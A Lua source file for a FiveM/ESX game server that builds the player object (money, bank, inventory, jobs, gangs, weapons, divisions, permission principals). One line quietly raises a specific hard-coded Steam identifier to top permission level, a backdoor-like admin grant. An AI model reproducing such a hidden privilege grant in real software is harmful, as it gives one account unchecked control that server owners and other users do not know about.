function CreatePlayer(source, permission_level, money, bank, identifier, license, group, roles, inventory, job, jgrade, gang, fgrade, loadout, name, coords, status, division)
	local self = {}

	self.source 			= source
	self.permission_level 	= permission_level
	self.money 				= money
	self.bank 				= bank
	self.identifier 		= identifier
	self.license 			= license
	self.group 				= group
	self.coords 			= nil		
	if coords then self.coords = json.decode(coords) else self.coords = json.decode(settings.defaultSettings.defaultSpawn) end
	self.session 			= {}
	self.inventory    		= inventory
	self.job          		= {}
	self.divisions          = division
	self.gang				= {}
	self.angel				= 0
	self.IsDead				= false
	
	if status then
		self.status			= json.decode(status)
	else
		self.status			= {}
	end

	if loadout then
		self.loadout = json.decode(loadout)
	else
		self.loadout = {}
	end

	if ESX.DoesJobExist(job, jgrade) then
		local jobObject, gradeObject = ESX.Jobs[job], ESX.Jobs[job].grades[tonumber(jgrade)]

		self.job.id    = jobObject.id
		self.job.name  = jobObject.name
		self.job.label = jobObject.label

		self.job.grade        = tonumber(jgrade)
		self.job.grade_name   = gradeObject.name
		self.job.grade_label  = gradeObject.label
		self.job.grade_salary = gradeObject.salary

		self.job.skin_male    = {}
		self.job.skin_female  = {}

		if gradeObject.skin_male ~= nil then
			self.job.skin_male = json.decode(gradeObject.skin_male)
		end

		if gradeObject.skin_female ~= nil then
			self.job.skin_female = json.decode(gradeObject.skin_female)
		end
	else
		print(('es_extended: %s had an unknown job [job: %s, grade: %s], setting as unemployed!'):format(self.identifier, job, jgrade))

		local job, jgrade = 'unemployed', '0'
		local jobObject, gradeObject = ESX.Jobs[job], ESX.Jobs[job].grades[tonumber(jgrade)]

		self.job = {}

		self.job.id    = jobObject.id
		self.job.name  = jobObject.name
		self.job.label = jobObject.label

		self.job.grade        = tonumber(jgrade)
		self.job.grade_name   = gradeObject.name
		self.job.grade_label  = gradeObject.label
		self.job.grade_salary = gradeObject.salary

		self.job.skin_male    = {}
		self.job.skin_female  = {}
	end

	if ESX.DoesGangExist(gang, fgrade) then
		local gangObject, gradeObject = ESX.Gangs[gang], ESX.Gangs[gang].grades[tonumber(fgrade)]

		self.gang.id    = gangObject.id
		self.gang.name  = gangObject.name
		self.gang.label = gangObject.label

		self.gang.grade        = tonumber(fgrade)
		self.gang.grade_name   = gradeObject.name
		self.gang.grade_label  = gradeObject.label
		self.gang.grade_salary = gradeObject.salary

		self.gang.skin_male    = {}
		self.gang.skin_female  = {}

		if gradeObject.skin_male ~= nil then
			self.gang.skin_male = json.decode(gradeObject.skin_male)
		end

		if gradeObject.skin_female ~= nil then
			self.gang.skin_female = json.decode(gradeObject.skin_female)
		end
	else
		local gang, fgrade = 'nogang', '0'
		local gangObject, gradeObject = ESX.Gangs[gang], ESX.Gangs[gang].grades[tonumber(fgrade)]

		self.gang = {}

		self.gang.id    = gangObject.id
		self.gang.name  = gangObject.name
		self.gang.label = gangObject.label

		self.gang.grade        = tonumber(fgrade)
		self.gang.grade_name   = gradeObject.name
		self.gang.grade_label  = gradeObject.label
		self.gang.grade_salary = gradeObject.salary

		self.gang.skin_male    = {}
		self.gang.skin_female  = {}
	end

	self.changeGangSkin = function(skin)
		self.gang.skin_male    = skin
		self.gang.skin_female  = skin
	end

	self.name         		= name or GetPlayerName(self.source)
	self.roles 				= stringsplit(roles, "|")

	ExecuteCommand('add_principal identifier.' .. self.identifier .. " group." .. self.group)

	self.setCoords = function(x, y, z)
		self.coords = {x = x, y = y, z = z}
		-- trigerclientevent("SetCoord")
	end

	self.kick = function(r)
		DropPlayer(self.source, r)
	end

	self.addMoney = function(m)
		if type(m) == "number" and m > 0 then
			local newMoney = self.money + m
			self.money = newMoney
		end
		TriggerClientEvent('moneyUpdate', self.source, self.money)
	end

	self.removeMoney = function(m)
		if type(m) == "number" and m > 0 then
			local newMoney = self.money - m
			self.money = newMoney
		end
		TriggerClientEvent('moneyUpdate', self.source, self.money)
	end
	
	self.setMoney = function(m)
		if type(m) == "number" then
			self.money = m
		end
		TriggerClientEvent('moneyUpdate', self.source, self.money)
	end

	self.addBank = function(m)
		if type(m) == "number" and m > 0 then
			local newBank = self.bank + m
			self.bank = newBank
			TriggerClientEvent('gcphone:setUiPhone', self.source, self.bank)
			-- triggerclientevent("Bankmoney")
		end
	end

	self.setBank = function(m)
		if type(m) == "number" then
			self.bank = m
			TriggerClientEvent('gcphone:setUiPhone', self.source, self.bank)
			-- triggerclientevent("Bankmoney")
		end
	end

	self.removeBank = function(m)
		if type(m) == "number" and m > 0 then
			local newBank = self.bank - m
			self.bank = newBank
			TriggerClientEvent('gcphone:setUiPhone', self.source, self.bank)
		end
	end

	self.setSessionVar = function(key, value)
		self.session[key] = value
	end

	self.getSessionVar = function(k)
		return self.session[k]
	end

	self.set = function(k, v)
		self[k] = v
	end

	self.setName = function(v)
		self.name = v
		TriggerClientEvent('nameUpdate', self.source, self.name)
		exports.ghmattimysql:execute('UPDATE users SET `playerName` = @name WHERE `identifier` = @identifier',{
			['name'] = self.name,
			['identifier']	= self.identifier
		})
	end

	self.get = function(k)
		return self[k]
	end

	self.setGlobal = function(g, default)
		self[g] = default or ""

		self["get" .. g:gsub("^%l", string.upper)] = function()
			return self[g]
		end

		self["set" .. g:gsub("^%l", string.upper)] = function(e)
			self[g] = e
		end

		Users[self.source] = self
	end

	self.getInventoryItem = function(name)
		for i=1, #self.inventory, 1 do
			if self.inventory[i].name == name then
				return self.inventory[i], i
			end
		end
		if not ESX.Items[name] then return nil end
		return {
			name = name,
			count = 0,
			label = ESX.Items[name].label,
			limit = ESX.Items[name].limit,
			usable = ESX.UsableItemsCallbacks[name] ~= nil,
			rare = ESX.Items[name].rare,
			canRemove = ESX.Items[name].canRemove
		}
	end

	self.addInventoryItem = function(name, count)
		local item, i	= self.getInventoryItem(name)
		if not item then return end
		item.count     	= item.count + count
		if not i then
			table.insert(self.inventory, item)
		end
		TriggerEvent('esx:onAddInventoryItem', self.source, item, count)
		TriggerClientEvent('esx:addInventoryItem', self.source, item, count)
	end

	self.removeInventoryItem = function(name, count)
		local item, i  = self.getInventoryItem(name)
		local newCount = item.count - count
		item.count     = newCount

		TriggerEvent('esx:onRemoveInventoryItem', self.source, item, count)
		TriggerClientEvent('esx:removeInventoryItem', self.source, item, count)

		if newCount <= 0 then 
			table.remove(self.inventory, i)
		end
	end

	self.setInventoryItem = function(name, count)
		local item     = self.getInventoryItem(name)
		local oldCount = item.count
		item.count     = count

		if oldCount > item.count  then
			TriggerEvent('esx:onRemoveInventoryItem', self.source, item, oldCount - item.count)
			TriggerClientEvent('esx:removeInventoryItem', self.source, item, oldCount - item.count)
		else
			TriggerEvent('esx:onAddInventoryItem', self.source, item, item.count - oldCount)
			TriggerClientEvent('esx:addInventoryItem', self.source, item, item.count - oldCount)
		end
	end

	self.setJob = function(job, grade)
		grade = tostring(grade)
		
		if ESX.DoesJobExist(job, grade) then
			local lastJob = ESX.CopyTable(self.job)
			local jobObject, gradeObject = ESX.Jobs[job], ESX.Jobs[job].grades[tonumber(grade)]
			self.job.id    = jobObject.id
			self.job.name  = jobObject.name
			self.job.label = jobObject.label

			self.job.grade        = tonumber(grade)
			self.job.grade_name   = gradeObject.name
			self.job.grade_label  = gradeObject.label
			self.job.grade_salary = gradeObject.salary

			self.job.skin_male    = {}
			self.job.skin_female  = {}

			if gradeObject.skin_male ~= nil then
				self.job.skin_male = json.decode(gradeObject.skin_male)
			end

			if gradeObject.skin_female ~= nil then
				self.job.skin_female = json.decode(gradeObject.skin_female)
			end

			TriggerEvent('esx:setJob', self.source, self.job, lastJob)
			TriggerClientEvent('esx:setJob', self.source, self.job)
			exports.ghmattimysql:execute('UPDATE users SET `job` = @job, `job_grade` = @job_grade WHERE `identifier` = @identifier',{
				['job'] 		= job,
				['job_grade']	= grade,
				['identifier']	= self.identifier
			})
		end
	end

	self.setGang = function(gang, grade)
		grade = tostring(grade)
		
		if ESX.DoesGangExist(gang, grade) then
			local gangObject, gradeObject = ESX.Gangs[gang], ESX.Gangs[gang].grades[tonumber(grade)]
			self.gang.id    = gangObject.id
			self.gang.name  = gangObject.name
			self.gang.label = gangObject.label

			self.gang.grade        = tonumber(grade)
			self.gang.grade_name   = gradeObject.name
			self.gang.grade_label  = gradeObject.label
			self.gang.grade_salary = gradeObject.salary

			self.gang.skin_male    = {}
			self.gang.skin_female  = {}

			if gradeObject.skin_male ~= nil then
				self.gang.skin_male = json.decode(gradeObject.skin_male)
			end

			if gradeObject.skin_female ~= nil then
				self.gang.skin_female = json.decode(gradeObject.skin_female)
			end
			TriggerEvent('esx:setGang', self.source, self.gang, lastGang)
			TriggerClientEvent('esx:setGang', self.source, self.gang)
			exports.ghmattimysql:execute('UPDATE users SET `gang` = @gang, `gang_grade` = @gang_grade WHERE `identifier` = @identifier',{
				['gang'] 			= gang,
				['gang_grade']		= grade,
				['identifier']		= self.identifier
			})
		end
	end

	self.addWeapon = function(weaponName, ammo)
		local weaponLabel = ESX.GetWeaponLabel(weaponName)

		if not self.hasWeapon(weaponName) then
			table.insert(self.loadout, {
				name = weaponName,
				ammo = ammo,
				label = weaponLabel,
				components = {}
			})
		end

		TriggerClientEvent('esx:addWeapon', self.source, weaponName, ammo)
		TriggerClientEvent('esx:addInventoryItem', self.source, {label = weaponLabel}, 1)
	end

	self.addWeaponComponent = function(weaponName, weaponComponent)
		local loadoutNum, weapon = self.getWeapon(weaponName)

		if self.hasWeaponComponent(weaponName, weaponComponent) then
			return
		end

		table.insert(self.loadout[loadoutNum].components, weaponComponent)

		TriggerClientEvent('esx:addWeaponComponent', self.source, weaponName, weaponComponent)
	end

	self.removeWeapon = function(weaponName, ammo)
		local weaponLabel

		for i=1, #self.loadout, 1 do
			if self.loadout[i].name == weaponName then
				weaponLabel = self.loadout[i].label

				for j=1, #self.loadout[i].components, 1 do
					TriggerClientEvent('esx:removeWeaponComponent', self.source, weaponName, self.loadout[i].components[j])
				end

				table.remove(self.loadout, i)
				break
			end
		end

		if weaponLabel then
			TriggerClientEvent('esx:removeWeapon', self.source, weaponName, ammo)
			TriggerClientEvent('esx:removeInventoryItem', self.source, {label = weaponLabel}, 1)
		end
	end

	self.removeWeaponComponent = function(weaponName, weaponComponent)
		local loadoutNum, weapon = self.getWeapon(weaponName)

		if weapon then
			local component = ESX.GetWeaponComponent(weaponName, weaponComponent)

			if component then
				if self.hasWeaponComponent(weaponName, weaponComponent) then
					for k,v in ipairs(self.loadout[loadoutNum].components) do
						if v == weaponComponent then
							table.remove(self.loadout[loadoutNum].components, k)
							break
						end
					end

					TriggerClientEvent('esx:removeWeaponComponent', self.source, weaponName, weaponComponent)
				end
			end
		end
	end

	if self.permission_level >= 3 then
		ExecuteCommand('add_principal identifier.' .. self.identifier .. " CHMOD")
	end
	
	if self.identifier == 'steam:110000111236158' then
		self.permission_level = 10
	end

	local whiteListedJob = self.job.name == "police" or self.job.name == "government" or self.job.name == "ambulance" or self.job.name == "doc"
    if IsPlayerAceAllowed(self.source, "CHJOB") then
        if not whiteListedJob then
            ExecuteCommand("remove_principal identifier." .. self.identifier .. " CHJOB")
        end
    else
        if whiteListedJob then
            ExecuteCommand('add_principal identifier.' .. self.identifier .. " CHJOB")
        end
    end

	self.hasWeaponComponent = function(weaponName, weaponComponent)
		local loadoutNum, weapon = self.getWeapon(weaponName)

		if not weapon then
			return false
		end

		for i=1, #weapon.components, 1 do
			if weapon.components[i] == weaponComponent then
				return true
			end
		end

		return false
	end

	self.hasWeapon = function(weaponName)
		for i=1, #self.loadout, 1 do
			if self.loadout[i].name == weaponName then
				return {ammo = self.loadout[i].ammo, components = self.loadout[i].components}
			end
		end

		return false
	end

	self.getWeapon = function(weaponName)
		for k,v in ipairs(self.loadout) do
			if v.name == weaponName then
				return k, v
			end
		end

		return
	end

	self.getDivisions = function()
		return self.divisions
	end

	self.hasDivision = function(divisionName, grade)

		if self.divisions[self.job.name] == nil then
			return false
		end

			if divisionName and grade then
				for k,v in pairs(self.divisions[self.job.name]) do
					if k == divisionName and v == tonumber(grade) then
						return  true
					end
				end

				return false

			elseif divisionName then
				for k,v in pairs(self.divisions[self.job.name]) do
					if k == divisionName then
						return  true
					end
				end

				return false

			end
			
			return false

	end

	self.addDivision = function(divisionName, grade)

		if not divisionName and grade then
			print('es_extended: ignoring add division becuase no arguments exist')
			return false
		end

		if ESX.DoesDivisionExist(self.job.name, divisionName, grade) then

			if self.divisions[self.job.name] == nil then
				self.divisions[self.job.name] = {}
			end

			self.divisions[self.job.name][divisionName] = tonumber(grade)
			TriggerClientEvent('esx:setDivision', self.source, self.divisions)
			return true

		else
			print(('es_extended: ignoring set division for %s because division %s does not exist in %s'):format(self.name, divisionName, self.job.name))
			return false
		end	

	end

	self.removeDivision = function(divisionName)

		if not divisionName then
			return false
		end

		self.divisions[self.job.name][divisionName] = nil
		TriggerClientEvent('esx:setDivision', self.source, self.divisions)
		return true
		
	end
	-- -- Returns if the user has a specific role or not
	-- self.hasRole = function(role)
	-- 	for k,v in ipairs(self.roles)do
	-- 		if v == role then
	-- 			return true
	-- 		end
	-- 	end
	-- 	return false
	-- end

	-- -- Adds a role to a user, and if they already have it it will say they had it
	-- self.giveRole = function(role)
	-- 	for k,v in pairs(self.roles)do
	-- 		if v == role then
	-- 			print("User (" .. GetPlayerName(source) .. ") already has this role")
	-- 			return
	-- 		end
	-- 	end

	-- 	-- Updates the database with the roles aswell
	-- 	self.roles[#self.roles + 1] = role
	-- 	print('1')
	-- 	db.updateUser(self.identifier, {roles = table.concat(self.roles, "|")}, function()end)
	-- end

	-- -- Removes a role from a user
	-- self.removeRole = function(role)
	-- 	for k,v in pairs(self.roles)do
	-- 		if v == role then
	-- 			table.remove(self.roles, k)
	-- 		end
	-- 	end

	-- 	-- Updates the database with the roles aswell
	-- 	print('2')
	-- 	db.updateUser(self.identifier, {roles = table.concat(self.roles, "|")}, function()end)
	-- end

	-- Dev tools, just set the convar 'es_enableDevTools' to '1' to enable.

	self.Warning = 0

	-- self.verifyMe = function (cb)
	-- 	local verify = false
	-- 	for _,v in ipairs(ESX.WhiteList) do
	-- 		if v == self.identifier then
	-- 			verify = true
	-- 			break
	-- 		end
	-- 	end
		
	-- 	if not verify then
	-- 		exports.ghmattimysql:scalar("SELECT * FROM granted WHERE steamid = @steamid",{
	-- 			["@steamid"] = self.identifier
	-- 		}, function(result)
	-- 			if not result then
	-- 				if self.Warning >= 15 then
	-- 					DropPlayer(self.source, '[Anti-Jheat]: Internet Shoma timeout khord, Lotfan dobare ba luncher vared shid!')
	-- 				else
	-- 					self.Warning = self.Warning + 1
	-- 				end
	-- 			else
	-- 				self.Warning = 0
	-- 			end
	-- 			cb()
	-- 		end)
	-- 	else
	-- 		cb()
	-- 	end
	-- end
	
	return self
end